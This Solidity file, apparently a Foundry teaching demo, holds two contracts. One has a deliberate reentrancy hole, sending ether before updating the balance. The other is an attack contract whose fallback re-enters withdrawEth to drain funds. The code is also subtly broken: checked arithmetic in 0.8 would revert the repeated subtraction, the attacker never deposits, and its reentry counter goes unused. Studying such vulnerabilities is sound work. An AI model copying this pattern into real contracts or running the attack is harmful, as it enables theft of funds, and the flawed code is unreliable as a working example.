// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";

contract ReentrancyVuln {
    mapping(address => uint256) balances;

    function giveEth() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawEth() public {
        uint256 amountToWithdraw = balances[msg.sender];
        (bool success,) = payable(msg.sender).call{value: amountToWithdraw}("");
        require(success);

        // check effects fail
        balances[msg.sender] -= amountToWithdraw;
    }
}

contract ExploitReentrancy {

    uint times_to_reenter = 0;

    function withdrawEthFromVulnContract(address reentrant_contract) public {
        (bool success, ) = reentrant_contract.call(abi.encodeWithSignature("withdrawEth()"));
        // require(success);
    }
    fallback() external payable {
        console.log("Fallback invoked balance of contract is now:", address(this).balance / 1e18, "Ether");
        (bool success,) = msg.sender.call(abi.encodeWithSignature("withdrawEth()"));
    }
}
